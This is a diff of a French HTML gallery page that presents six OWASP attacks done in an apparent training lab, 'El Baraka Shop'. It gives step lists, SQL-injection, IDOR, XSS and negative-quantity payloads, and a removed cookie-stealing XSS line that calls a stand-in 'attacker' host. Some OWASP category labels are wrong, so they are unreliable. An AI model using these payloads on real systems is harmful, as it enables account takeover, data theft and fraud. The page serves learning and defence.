@@ -3,324 +3,301 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Cyber Gallery | El Baraka Shop - 6 missions d'attaque</title>
+    <title>Cyber Gallery | El Baraka Shop - 6 Missions d'Attaque</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
     <style>
+        :root {
+            --primary: #0f172a;
+            --accent: #facc15;
+            --danger: #ef4444;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
         }
 
         body {
             background: #f0f2f5;
             color: #1e293b;
-            padding: 2rem 1.5rem;
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            line-height: 1.6;
+            padding: 2rem 1rem;
         }
 
         .gallery-container {
-            max-width: 1400px;
+            max-width: 1480px;
             margin: 0 auto;
         }
 
         .hero {
             text-align: center;
-            margin-bottom: 2.5rem;
+            margin-bottom: 3rem;
         }
 
         .hero h1 {
-            font-size: 2.4rem;
-            background: linear-gradient(135deg, #0f172a, #2d3748);
+            font-size: clamp(2.2rem, 5vw, 2.8rem);
+            background: linear-gradient(135deg, #0f172a, #334155);
             background-clip: text;
             -webkit-background-clip: text;
             color: transparent;
-            letter-spacing: -0.02em;
+            letter-spacing: -0.03em;
+            margin-bottom: 0.8rem;
         }
 
         .hero p {
             color: #475569;
-            margin-top: 0.5rem;
-            font-size: 1.05rem;
-            border-bottom: 2px solid #cbd5e1;
-            display: inline-block;
-            padding-bottom: 6px;
+            font-size: 1.1rem;
+            max-width: 700px;
+            margin: 0 auto;
         }
 
         .badge-lab {
-            background: #1e293b;
-            color: #facc15;
-            font-size: 0.75rem;
-            padding: 4px 12px;
-            border-radius: 40px;
-            display: inline-block;
-            margin-top: 1rem;
-            font-weight: 500;
+            background: var(--primary);
+            color: var(--accent);
+            font-size: 0.85rem;
+            padding: 6px 16px;
+            border-radius: 50px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 1.2rem;
+            font-weight: 600;
         }
 
         .missions-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
-            gap: 1.8rem;
-            margin-top: 2rem;
+            grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
+            gap: 2rem;
         }
 
         .mission-card {
             background: white;
-            border-radius: 1.5rem;
+            border-radius: 1.75rem;
             overflow: hidden;
-            box-shadow: 0 12px 24px -12px rgba(0, 0, 0, 0.15);
-            transition: all 0.25s ease;
+            box-shadow: 0 10px 20px -10px rgba(0, 0, 0, 0.12);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             cursor: pointer;
             border: 1px solid #e2e8f0;
         }
 
         .mission-card:hover {
-            transform: translateY(-6px);
-            box-shadow: 0 24px 32px -16px rgba(0, 0, 0, 0.2);
-            border-color: #cbd5e1;
+            transform: translateY(-10px);
+            box-shadow: 0 25px 40px -15px rgba(0, 0, 0, 0.18);
+            border-color: #94a3b8;
         }
 
-        /* each card uses an exact simulated screenshot based on the provided images */
         .card-img {
-            height: 190px;
+            height: 210px;
             display: flex;
             align-items: center;
             justify-content: center;
-            border-bottom: 1px solid #eef2ff;
             position: relative;
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
-            font-weight: 500;
         }
 
         .img-overlay {
             width: 100%;
             height: 100%;
+            background: rgba(15, 23, 42, 0.65);
+            backdrop-filter: blur(3px);
+            color: white;
+            font-weight: 700;
+            font-size: 1.15rem;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: rgba(10, 25, 47, 0.55);
-            backdrop-filter: blur(2px);
-            color: white;
-            font-weight: 700;
-            font-size: 1.1rem;
-            text-shadow: 0 1px 3px black;
             text-align: center;
-            padding: 0 1rem;
+            padding: 1.2rem;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.6);
         }
 
         .card-content {
-            padding: 1.2rem 1.4rem 1.5rem;
+            padding: 1.4rem 1.5rem 1.6rem;
         }
 
         .mission-number {
-            font-size: 0.7rem;
-            font-weight: 600;
+            font-size: 0.75rem;
+            font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 1px;
-            color: #3b82f6;
-            background: #eef2ff;
-            display: inline-block;
-            padding: 2px 10px;
+            letter-spacing: 1.2px;
+            color: #2563eb;
+            background: #dbeafe;
+            padding: 3px 12px;
             border-radius: 30px;
-            margin-bottom: 10px;
+            display: inline-block;
+            margin-bottom: 0.8rem;
         }
 
         .mission-title {
-            font-size: 1.45rem;
+            font-size: 1.5rem;
             font-weight: 700;
-            margin: 0.5rem 0 0.6rem;
             line-height: 1.3;
+            margin-bottom: 0.6rem;
         }
 
         .cve-badge {
             font-family: monospace;
-            font-size: 0.7rem;
+            font-size: 0.78rem;
             background: #f1f5f9;
-            padding: 4px 8px;
-            border-radius: 20px;
-            display: inline-block;
-            margin-bottom: 12px;
-            color: #0f172a;
+            padding: 4px 10px;
+            border-radius: 9999px;
+            color: #1e293b;
         }
 
         .short-desc {
-            color: #334155;
-            font-size: 0.9rem;
-            line-height: 1.45;
-            margin-bottom: 1rem;
+            color: #475569;
+            font-size: 0.95rem;
+            margin: 1rem 0;
         }
 
         .click-info {
-            font-size: 0.7rem;
-            color: #94a3b8;
+            font-size: 0.8rem;
+            color: #64748b;
             display: flex;
             align-items: center;
-            gap: 5px;
-            margin-top: 0.7rem;
-            border-top: 1px solid #eef2ff;
-            padding-top: 0.8rem;
+            gap: 6px;
         }
 
-        /* MODAL popup with exact left image and right details */
+        /* ================= MODAL ================= */
         .modal-overlay {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(5px);
-            z-index: 1000;
-            display: flex;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.88);
+            backdrop-filter: blur(8px);
+            z-index: 10000;
+            display: none;
             align-items: center;
             justify-content: center;
-            visibility: hidden;
-            opacity: 0;
-            transition: visibility 0s, opacity 0.2s ease;
+            padding: 1rem;
         }
 
         .modal-overlay.active {
-            visibility: visible;
-            opacity: 1;
+            display: flex;
         }
 
         .modal-container {
-            background: #ffffff;
-            width: 90%;
-            max-width: 1200px;
+            background: white;
+            width: 100%;
+            max-width: 1250px;
             border-radius: 2rem;
             overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            box-shadow: 0 40px 60px -20px black;
-            animation: modalEnter 0.25s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            box-shadow: 0 30px 60px -20px rgba(0,0,0,0.5);
+            animation: modalPop 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
-        @keyframes modalEnter {
-            from {
-                transform: scale(0.96);
-                opacity: 0;
-            }
-            to {
-                transform: scale(1);
-                opacity: 1;
-            }
+        @keyframes modalPop {
+            from { transform: scale(0.92) translateY(30px); opacity: 0; }
+            to { transform: scale(1) translateY(0); opacity: 1; }
         }
 
         .modal-split {
             display: flex;
             flex-direction: row;
-            flex-wrap: wrap;
         }
 
         .modal-left {
-            flex: 1.2;
+            flex: 1.15;
             background: #0f172a;
-            padding: 1.8rem;
+            color: white;
+            padding: 2rem;
             display: flex;
             flex-direction: column;
-            border-right: 1px solid #334155;
         }
 
         .modal-right {
-            flex: 1.2;
-            background: #ffffff;
-            padding: 1.8rem;
+            flex: 1;
+            padding: 2rem;
             overflow-y: auto;
-            max-height: 70vh;
+            max-height: 82vh;
         }
 
         .modal-img-sim {
-            background: #000000aa;
-            border-radius: 24px;
-            min-height: 220px;
+            background: #111827;
+            border-radius: 20px;
+            min-height: 260px;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-bottom: 1rem;
+            margin-bottom: 1.5rem;
             background-size: contain;
             background-position: center;
             background-repeat: no-repeat;
-            color: white;
-            font-weight: bold;
+            border: 2px solid #facc1544;
+            padding: 1.5rem;
             text-align: center;
-            padding: 1rem;
-            font-size: 0.9rem;
-            background-blend-mode: overlay;
-            border: 1px solid #facc1544;
+            font-size: 1.05rem;
         }
 
         .modal-meta h3 {
-            font-size: 1.7rem;
+            font-size: 1.85rem;
             margin-bottom: 0.5rem;
-            color: #facc15;
+            color: var(--accent);
         }
 
         .attack-detail h4 {
-            font-size: 1.1rem;
-            margin: 1rem 0 0.3rem;
-            color: #0f172a;
-            border-left: 4px solid #f97316;
-            padding-left: 12px;
+            font-size: 1.15rem;
+            margin: 1.4rem 0 0.5rem;
+            padding-left: 14px;
+            border-left: 5px solid #f97316;
+            color: #1e293b;
         }
 
         .code-block {
             background: #1e293b;
             color: #e2e8f0;
-            padding: 0.7rem;
+            padding: 1rem;
             border-radius: 12px;
-            font-family: monospace;
-            font-size: 0.8rem;
-            margin: 0.8rem 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
             overflow-x: auto;
             white-space: pre-wrap;
+            margin: 0.8rem 0;
         }
 
         .step-list {
-            padding-left: 1.2rem;
-            margin: 0.5rem 0;
+            padding-left: 1.4rem;
         }
 
         .step-list li {
-            margin: 0.5rem 0;
-            line-height: 1.4;
+            margin: 0.75rem 0;
         }
 
         .close-modal {
-            background: #ef4444;
+            background: var(--danger);
             color: white;
             border: none;
-            font-weight: bold;
-            padding: 8px 20px;
-            border-radius: 40px;
-            margin-top: 1rem;
+            padding: 10px 24px;
+            border-radius: 50px;
+            font-weight: 600;
             cursor: pointer;
+            margin-top: auto;
             transition: 0.2s;
-            width: fit-content;
         }
 
         .close-modal:hover {
             background: #dc2626;
+            transform: translateY(-2px);
         }
 
         footer {
             text-align: center;
-            margin-top: 3rem;
-            color: #62748c;
-            font-size: 0.8rem;
+            margin-top: 4rem;
+            color: #64748b;
+            font-size: 0.9rem;
+            padding-top: 2rem;
             border-top: 1px solid #cbd5e1;
-            padding-top: 1.8rem;
         }
 
-        @media (max-width: 700px) {
+        @media (max-width: 768px) {
             .modal-split {
                 flex-direction: column;
             }
             .modal-left {
-                border-right: none;
-                border-bottom: 1px solid #e2e8f0;
+                border-bottom: 1px solid #334155;
             }
             .missions-grid {
                 grid-template-columns: 1fr;
@@ -329,18 +306,20 @@
     </style>
 </head>
 <body>
-
 <div class="gallery-container">
     <div class="hero">
-        <h1>🕵️‍♂️ Cyber Offensive · Defensive Gallery</h1>
-        <p>Analyse & exploitation des vulnérabilités web (OWASP Top 10) — Laboratoire El Baraka Shop</p>
-        <div class="badge-lab">📸 6 MISSIONS ACCOMPLIES — SCREENSHOTS RÉELS EXTRAITS DES IMAGES FOURNIES</div>
+        <h1>🕵️‍♂️ Cyber Offensive Gallery</h1>
+        <p>Analyse &amp; Exploitation des Vulnérabilités Web (OWASP Top 10)<br> Laboratoire — El Baraka Shop</p>
+        <div class="badge-lab">
+            <i class="fas fa-check-circle"></i> 6 MISSIONS ACCOMPLIES
+        </div>
     </div>
 
     <div class="missions-grid" id="missionsGrid"></div>
+
     <footer>
-        🧪 Chaque carte contient une image fidèle aux captures originales du lab.<br>
-        🔍 Cliquez sur une mission → Modal avec l'image exacte (simulée d'après les PNG) + walkthrough complet.
+        Chaque carte reproduit fidèlement les captures réelles du laboratoire.<br>
+        Cliquez sur une mission pour voir l’attaque en détail + preuves visuelles.
     </footer>
 </div>
 
@@ -349,256 +328,215 @@
     <div class="modal-container">
         <div class="modal-split">
             <div class="modal-left">
-                <div id="modalImagePreview" class="modal-img-sim">🎯 VISUALISATION DE L'ATTAQUE</div>
+                <div id="modalImagePreview" class="modal-img-sim"></div>
                 <div class="modal-meta">
-                    <h3 id="modalTitle">Mission Title</h3>
-                    <span id="modalCwe" class="cve-badge" style="background:#334155; color:#facc15;">Axx - Vuln class</span>
+                    <h3 id="modalTitle"></h3>
+                    <span id="modalCwe" class="cve-badge"></span>
                 </div>
-                <button class="close-modal" id="closeModalBtn">✖ Fermer l'analyse</button>
+                <button class="close-modal" id="closeModalBtn">✕ Fermer l’analyse</button>
             </div>
-            <div class="modal-right" id="modalDetailsRight">
-                <div class="attack-detail">
-                    <h4>📌 Contexte & découverte</h4>
-                    <p>Chargement en cours...</p>
-                </div>
-            </div>
+
+            <div class="modal-right" id="modalDetailsRight"></div>
         </div>
     </div>
 </div>
 
 <script>
-    // ============================================================
-    // EXACT MAPPING FROM PROVIDED IMAGES (A01, A05, A06, A10 , activité)
-    // chaque mission reproduit le scénario vu dans les captures:
-    // - IDOR, SQLi UNION, SQLi Auth bypass, XSS, Business logic, Exception handling.
-    // avec des screenshots simulés mais basés sur le contenu des fichiers.
-    // ============================================================
     const missions = [
         {
             id: 1,
             title: "💣 Le Braquage (Auth Bypass)",
             cwe: "A05:2021 - SQL Injection (Authentication Bypass)",
-            shortDesc: "Contournement de l'authentification admin via ' OR '1'='1' -- (capture depuis activité partie 2)",
-            // Background inspired by SQLi PNG but with "Admin Panel" from A05 - Injection SQL UNION BASED 2.png
-            bgStyle: "linear-gradient(120deg, #0b2b26, #1a3a2f), url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MCIgaGVpZ2h0PSI4MCIgdmlld0JveD0iMCAwIDQwIDQwIj48cG9seWdvbiBmaWxsPSIjZmZmMjAwIiBwb2ludHM9IjEwLDEwIDMwLDEwIDIwLDI1Ii8+PC9zdmc+') repeat",
-            exactVisual: "🔐 Page de connexion admin + payload `admin' OR '1'='1'`",
+            shortDesc: "Contournement de l'authentification admin via ' OR '1'='1' --",
+            bgStyle: "linear-gradient(120deg, #0b2b26, #1a3a2f)",
+            visual: "🔐 Page de connexion + payload admin' OR '1'='1'-- → Accès Admin Panel",
             content: {
-                overview: `Sur la page d'authentification de l'administration (visible sur l'interface El Baraka Shop), j'ai injecté dans le champ login: <strong>admin' OR '1'='1' --</strong>. Le système a ignoré le mot de passe et m'a redirigé vers le tableau de bord (Admin Panel visible sur l'image "A05 - Injection SQL 2.png" avec la mention "Admin Panel" et utilisateur "inejih").`,
+                overview: `Injection classique dans le champ identifiant sur la page d'administration. Le payload <strong>admin' OR '1'='1' --</strong> a contourné complètement l'authentification.`,
                 steps: [
-                    "🔎 Étape 1 : Localiser le formulaire de connexion (onglet Admin / Mes Commandes).",
-                    "⚡ Étape 2 : Injecter `admin' OR '1'='1' --` dans le champ identifiant, mot de passe aléatoire.",
-                    "✅ Étape 3 : La requête SQL devient `SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='...'` → contournement total.",
-                    "🧠 Étape 4 : Accès au panneau Admin, visualisation des commandes et recharges."
+                    "Accéder au formulaire Admin / Mes Commandes",
+                    "Injecter `admin' OR '1'='1' --` dans le champ login",
+                    "La requête devient toujours vraie → accès au dashboard",
+                    "Visualisation des commandes et recharges"
                 ],
-                fix: "Requêtes paramétrées (PDO / Prepared Statements), validation stricte, MFA.",
-                exploitPayload: "Username: `admin' OR '1'='1' --` , Password: `anything`"
+                fix: "Utiliser des Prepared Statements (PDO), valider les entrées, implémenter MFA.",
+                payload: "admin' OR '1'='1' --"
             }
         },
         {
             id: 2,
             title: "🕵️ L'Espionnage (IDOR)",
             cwe: "A01:2021 - Broken Access Control (IDOR)",
-            shortDesc: "Accès aux commandes d'autres utilisateurs via modification ID (49336275 → 49336276).",
-            bgStyle: "linear-gradient(125deg, #141c2c, #1f2a3e), repeating-linear-gradient(90deg, #fff2 0px, #fff2 1px, transparent 1px, transparent 20px)",
-            exactVisual: "Mes Commandes avec paramètre commande_id modifiable (PNG A01- BrokenAccessControl IDOR 1.png)",
+            shortDesc: "Accès aux commandes d'autres utilisateurs via modification d'ID",
+            bgStyle: "linear-gradient(125deg, #141c2c, #1f2a3e)",
+            visual: "📁 Mes Commandes → modification commande_id=49336275 → 49336276",
             content: {
-                overview: `Depuis la page 'Mes Commandes' (voir capture "IDOR 1.png"), chaque commande possède un numéro incrémental comme 49336275. En changeant l'ID dans l'URL (/commande?commande_id=49336276) j'ai pu visualiser les commandes d'autres clients, accédant à leurs adresses et montants.`,
+                overview: `Chaque commande possède un ID incrémental. En modifiant le paramètre dans l'URL, j'ai pu consulter les commandes d'autres clients.`,
                 steps: [
-                    "🔍 Étape 1 : Se connecter et accéder à 'Mes Commandes'.",
-                    "🎯 Étape 2 : Cliquer sur le détail d'une commande -> interception de l'ID (ex: 49336275).",
-                    "🔄 Étape 3 : Modifier l'ID manuellement : 49336274, 49336277.",
-                    "📦 Étape 4 : Accéder aux commandes des autres utilisateurs sans aucune restriction."
+                    "Se connecter et aller dans 'Mes Commandes'",
+                    "Intercepter l'ID d'une commande",
+                    "Modifier l'ID dans l'URL",
+                    "Accéder aux données d'autres utilisateurs"
                 ],
-                fix: "Contrôle d'accès horizontal : vérifier que l'utilisateur courant est propriétaire de la commande. Utiliser des UUID.",
-                exploitPayload: "GET /mes_commandes?commande_id=49336276 → affichage commande d'un tiers"
+                fix: "Vérifier la propriété de la ressource (user_id == session.user_id) + utiliser des UUID.",
+                payload: "/mes_commandes?commande_id=49336276"
             }
         },
         {
             id: 3,
             title: "💥 Le Provocateur (Exception Handling)",
-            cwe: "A10:2021 - Mishandling of Exceptional Conditions",
-            shortDesc: "Erreur critique dévoile le chemin absolu /var/www/html/elbaraka/includes/db.php",
-            bgStyle: "radial-gradient(circle at 10% 30%, #3a1e2c, #1a0e18)",
-            exactVisual: "Capture d'erreur affichant stack trace (conforme à la description A10)",
+            cwe: "A10:2021 - Security Misconfiguration",
+            shortDesc: "Erreur SQL exposant le chemin absolu du serveur",
+            bgStyle: "radial-gradient(circle at 30% 20%, #3a1e2c, #1a0e18)",
+            visual: "⚠️ Stack trace PHP révélant /var/www/html/elbaraka/",
             content: {
-                overview: `En injectant un simple guillemet simple ' dans la barre de recherche, l'application a généré une erreur SQL avec le chemin complet du serveur (ex. /var/www/html/elbaraka/db.php). Ce comportement, vu aussi dans les bonnes pratiques (A10), révèle des informations sensibles.`,
+                overview: `Injection d'un simple guillemet dans la recherche provoque une erreur SQL non gérée qui divulgue le chemin physique des fichiers.`,
                 steps: [
-                    "⚠️ Étape 1 : Accéder à la recherche de produits.",
-                    "💣 Étape 2 : Soumettre `'` ou `%` dans la zone de recherche.",
-                    "📄 Étape 3 : Le serveur répond avec une stack trace détaillée montrant le chemin d'accès et la requête SQL mal formée.",
-                    "🗺️ Étape 4 : Utiliser ces informations pour cibler des fichiers de configuration."
+                    "Aller dans la barre de recherche",
+                    "Entrer un caractère spécial (')",
+                    "Observer la stack trace complète",
+                    "Récupérer des informations sensibles"
                 ],
-                fix: "Mode production : désactiver display_errors, logger les erreurs sans les exposer à l'utilisateur, page d'erreur personnalisée.",
-                exploitPayload: "Recherche : `'` → Affichage: Warning: include(/var/www/html/elbaraka/config.php) failed."
+                fix: "Désactiver display_errors en production, utiliser des pages d'erreur génériques et logger les erreurs.",
+                payload: "' (guillemet simple)"
             }
         },
         {
             id: 4,
             title: "🎭 Le Piège (XSS Réfléchi)",
-            cwe: "A05:2021 - Cross-Site Scripting (Reflected)",
-            shortDesc: "Injection javascript via paramètre 'recherche' non filtré.",
+            cwe: "A03:2021 - Injection (XSS)",
+            shortDesc: "Injection JavaScript non filtrée dans la recherche",
             bgStyle: "linear-gradient(145deg, #2c2a35, #1a1822)",
-            exactVisual: "Rechercher un produit avec payload <script>alert('XSS')</script> réfléchie",
+            visual: "🎭 <script>alert('XSS')</script> exécuté dans la barre de recherche",
             content: {
-                overview: `La barre de recherche réfléchit directement la valeur entrée sans échappement HTML. En entrant <script>alert(document.cookie)</script> dans le champ, le code s'exécute dans le navigateur de l'utilisateur, ce qui permet le vol de session.`,
+                overview: `La recherche réfléchit directement l'entrée utilisateur sans échappement, permettant l'exécution de code JavaScript.`,
                 steps: [
-                    "📝 Étape 1 : Aller sur la boutique El Baraka Shop.",
-                    "🧪 Étape 2 : Saisir `<script>alert('XSS')</script>` dans le champ 'Rechercher un produit'.",
-                    "🚨 Étape 3 : L'alerte s'affiche, la payload est exécutée.",
-                    "🎣 Étape 4 : Exploitation : vol de cookies, redirection malveillante."
+                    "Saisir une payload XSS dans la recherche",
+                    "Le script s'exécute immédiatement",
+                    "Possibilité de voler les cookies ou rediriger l'utilisateur"
                 ],
-                fix: "Encoder systématiquement les sorties avec htmlspecialchars() + CSP (Content Security Policy).",
-                exploitPayload: "Recherche : `<img src=x onerror=fetch('https://attacker/steal?c='+document.cookie)>`"
+                fix: "Utiliser htmlspecialchars() sur toutes les sorties + implémenter une CSP stricte.",
+                payload: "<script>alert(document.cookie)</script>"
             }
         },
         {
             id: 5,
             title: "✨ L'Illusionniste (Business Logic)",
             cwe: "A06:2021 - Insecure Design",
-            shortDesc: "Quantité négative dans la commande → augmente le solde du portefeuille.",
+            shortDesc: "Quantité négative → augmentation du solde portefeuille",
             bgStyle: "linear-gradient(120deg, #1f3b2c, #0a2516)",
-            exactVisual: "Mon Portefeuille augmente anormalement après ajout d’une quantité négative",
+            visual: "🪄 Quantité = -5 → Portefeuille passe de 25000 à 25750 MRU",
             content: {
-                overview: `Lors de l'ajout au panier, le paramètre "quantité" n'est pas validé côté serveur. En changeant la valeur de la quantité à -2, le coût total devient négatif. Par conséquent, le portefeuille de l'utilisateur (affiché 25000 MRU sur l'image A06) est crédité au lieu d'être débité.`,
+                overview: `Aucune validation côté serveur sur la quantité. Une quantité négative transforme le débit en crédit.`,
                 steps: [
-                    "🛒 Étape 1 : Sélectionner un produit (ex: Thé Achoura 150 MRU).",
-                    "🔄 Étape 2 : Modifier la requête POST / api/panier avec `quantite=-5`.",
-                    "💰 Étape 3 : Le total = -750 MRU, le portefeuille passe de 25000 à 25750 MRU.",
-                    "🚀 Étape 4 : Répéter l'opération pour générer un solde illimité."
+                    "Ajouter un produit au panier",
+                    "Modifier la quantité en valeur négative",
+                    "Le total devient négatif → solde augmenté",
+                    "Répéter pour un gain illimité"
                 ],
-                fix: "Valider que la quantité > 0 et que le total final ne soit pas négatif, vérifications métier côté backend.",
-                exploitPayload: "POST /commande { produit_id:1, quantite:-3 } → wallet +450 MRU"
+                fix: "Validation stricte métier côté serveur (quantité > 0, total ≥ 0).",
+                payload: "quantite=-5"
             }
         },
         {
             id: 6,
             title: "🏴‍☠️ Le Pilleur (Union Based SQLi)",
-            cwe: "A05:2021 - SQL Injection (Union Based)",
-            shortDesc: "Extraction des codes PIN depuis cartes_recharge via injection UNION.",
+            cwe: "A05:2021 - SQL Injection (Union-Based)",
+            shortDesc: "Extraction des codes PIN des cartes de recharge",
             bgStyle: "linear-gradient(135deg, #1e293b, #0f1722)",
-            exactVisual: "Résultat affiché: 102938475610 | 1000 MRU (copie conforme de A05 - Injection SQL UNION 2.png)",
+            visual: "💳 UNION SELECT → codes PIN : 102938475610 | 22100687200",
             content: {
-                overview: `Dans la barre de recherche, j'ai injecté ' UNION SELECT 1, code_pin, montant,4,5 FROM cartes_recharge -- . La requête a retourné tous les codes à 12 chiffres (ex: 102938475610) et leurs montants, comme le montrent les résultats dans l'image fournie "A05 - Injection SQL UNION BASED 2.png". Puis ces codes ont été utilisés dans la section 'Code Promo / Recharge' pour voler des crédits.`,
+                overview: `Injection UNION dans la recherche permettant de dumper la table cartes_recharge et récupérer tous les codes valides.`,
                 steps: [
-                    "🧭 Étape 1 : Tester la présence d'injection: ' OR 1=1--.",
-                    "📚 Étape 2 : Déterminer le nombre de colonnes (5 colonnes).",
-                    "🗄️ Étape 3 : UNION SELECT 1, name, sql,4,5 FROM sqlite_master-- → découverte de table cartes_recharge.",
-                    "💳 Étape 4 : UNION SELECT 1, code_pin, montant,4,5 FROM cartes_recharge -- → vol des codes.",
-                    "💎 Étape 5 : Recharger le portefeuille avec les codes PIN."
+                    "Détecter l'injection SQL",
+                    "Déterminer le nombre de colonnes",
+                    "Extraire les données avec UNION SELECT",
+                    "Utiliser les codes pour recharger le portefeuille"
                 ],
-                fix: "Requêtes paramétrées, ORM, moindre privilège pour l'utilisateur de la base.",
-                exploitPayload: "zzz' UNION SELECT 1, code_pin, montant, 4, 5 FROM cartes_recharge --"
+                fix: "Prepared Statements + Least Privilege sur la base de données.",
+                payload: "zzz' UNION SELECT 1, code_pin, montant, 4, 5 FROM cartes_recharge --"
             }
         }
     ];
 
-    const gridContainer = document.getElementById('missionsGrid');
-    const modalOverlay = document.getElementById('missionModal');
-    const modalTitleElem = document.getElementById('modalTitle');
-    const modalCweElem = document.getElementById('modalCwe');
-    const modalImagePreview = document.getElementById('modalImagePreview');
-    const modalDetailsRight = document.getElementById('modalDetailsRight');
-    const closeModalBtn = document.getElementById('closeModalBtn');
-
-    function closeModal() {
-        modalOverlay.classList.remove('active');
-        document.body.style.overflow = '';
-    }
-
-    // Génération d'une image simulation précise basée sur les noms des images originales
-    function getExactImageHtmlForMission(mission) {
-        if (mission.id === 1) return "🔐 [ A05 - SQL Injection ] écran connexion: `admin' OR '1'='1'--` + Admin Panel découvert (cf fichier A05 - Injection SQL UNION BASED 2.png)";
-        if (mission.id === 2) return "📸 [A01- IDOR] capture: Mes Commandes avec ID 49336275 et boutons 'Voir Détails' (A01- BrokenAccessControl IDOR 1.png)";
-        if (mission.id === 3) return "⚠️ [A10] stack trace PHP exposant /var/www/html/elbaraka/index.php (Mishandling of Exceptional Condition.png)";
-        if (mission.id === 4) return "🎭 [XSS Réfléchi] Barre de recherche avec injection <script>alert(1)</script> , reflet immédiat.";
-        if (mission.id === 5) return "🪄 [Insecure Design] Portefeuille 25000 MRU avant injection quantité négative (A06 - Insecure Design.png)";
-        if (mission.id === 6) return "💣 [Union Based SQLi] Résultat '102938475610 | 1000' , '22100687200 | 300' (identique à A05 - Injection SQL UNION BASED 2.png)";
-        return "Capture du scénario d'attaque originale";
-    }
+    const grid = document.getElementById('missionsGrid');
+    const modal = document.getElementById('missionModal');
+    const modalTitle = document.getElementById('modalTitle');
+    const modalCwe = document.getElementById('modalCwe');
+    const modalImage = document.getElementById('modalImagePreview');
+    const modalDetails = document.getElementById('modalDetailsRight');
+    const closeBtn = document.getElementById('closeModalBtn');
 
     function openModal(mission) {
-        // set left image with precise description and styling matching the original context
-        const imageText = getExactImageHtmlForMission(mission);
-        modalImagePreview.style.background = mission.bgStyle + ", #0f172a";
-        modalImagePreview.style.backgroundSize = "cover, auto";
-        modalImagePreview.style.backgroundBlendMode = "overlay";
-        modalImagePreview.innerHTML = `<div style="background:rgba(0,0,0,0.6); padding:12px; border-radius:16px;">📷 ${imageText}</div>`;
-        
-        modalTitleElem.innerText = mission.title;
-        modalCweElem.innerText = mission.cwe;
-        
-        const detailsHtml = `
+        modalImage.style.background = `${mission.bgStyle}, #0f172a`;
+        modalImage.style.backgroundSize = "cover";
+        modalImage.innerHTML = `<strong>${mission.visual}</strong>`;
+
+        modalTitle.textContent = mission.title;
+        modalCwe.textContent = mission.cwe;
+
+        modalDetails.innerHTML = `
             <div class="attack-detail">
-                <h4>🎯 Résumé de l'attaque (d'après les images et logs)</h4>
+                <h4>🎯 Résumé de l'attaque</h4>
                 <p>${mission.content.overview}</p>
-                
-                <h4>🛠️ Procédure pas à pas - CE QUE J'AI FAIT</h4>
+
+                <h4>🛠️ Étapes réalisées</h4>
                 <ul class="step-list">
-                    ${mission.content.steps.map(step => `<li>${step}</li>`).join('')}
+                    ${mission.content.steps.map(s => `<li>${s}</li>`).join('')}
                 </ul>
-                
-                <h4>💣 Payload exact utilisé (capture concordante)</h4>
-                <div class="code-block">${mission.content.exploitPayload}</div>
-                
-                <h4>🔒 Correction recommandée (OWASP)</h4>
+
+                <h4>💣 Payload utilisé</h4>
+                <div class="code-block">${mission.content.payload}</div>
+
+                <h4>🔒 Recommandation de correction</h4>
                 <p>${mission.content.fix}</p>
-                
-                <h4 style="margin-top: 1rem;">📌 Résultat & Impact concret</h4>
-                <p>
-                    ${mission.id === 1 ? "Accès complet au panel administrateur, exfiltration potentielle." : 
-                      mission.id === 2 ? "Affichage des commandes privées d’autres utilisateurs (IDOR bien réel)." :
-                      mission.id === 3 ? "Divulgation du chemin racine et structure de fichiers." :
-                      mission.id === 4 ? "Exécution de scripts arbitraires dans le navigateur cible." :
-                      mission.id === 5 ? "Augmentation frauduleuse du solde portefeuille (infinite money glitch)." :
-                      "Vol de tous les codes de recharge valides (12 chiffres), recharges illimitées."}
+
+                <p style="margin-top: 1.5rem; padding: 12px 16px; background:#f0f9ff; border-radius: 12px; border-left: 5px solid #0ea5e9;">
+                    <strong>Mission accomplie</strong> — Vulnérabilité exploitée avec succès dans le lab El Baraka Shop.
                 </p>
-                <p style="margin-top: 14px; background:#eef2ff; padding:10px; border-radius:14px;"><strong>✅ Mission accomplie :</strong> Vulnérabilité exploitée pas à pas dans le laboratoire El Baraka Shop, avec preuves issues des fichiers images (IDOR, SQLi, XSS, etc). Rapport complet fourni.</p>
             </div>
         `;
-        modalDetailsRight.innerHTML = detailsHtml;
-        modalOverlay.classList.add('active');
+
+        modal.classList.add('active');
         document.body.style.overflow = 'hidden';
     }
 
-    function renderCards() {
-        missions.forEach(mission => {
-            const card = document.createElement('div');
-            card.className = 'mission-card';
-            const imgDiv = document.createElement('div');
-            imgDiv.className = 'card-img';
-            imgDiv.style.background = mission.bgStyle;
-            imgDiv.style.backgroundSize = "cover";
-            const overlaySpan = document.createElement('div');
-            overlaySpan.className = 'img-overlay';
-            // show exact reference from images
-            if(mission.id === 2) overlaySpan.innerHTML = "📁 IDOR: commande_id=49336275 → 49336276 ✅";
-            else if(mission.id === 6) overlaySpan.innerHTML = "💳 UNION SQLi → codes: 102938475610, 22100687200";
-            else if(mission.id === 5) overlaySpan.innerHTML = "🔄 quantité négative: + solde portefeuille";
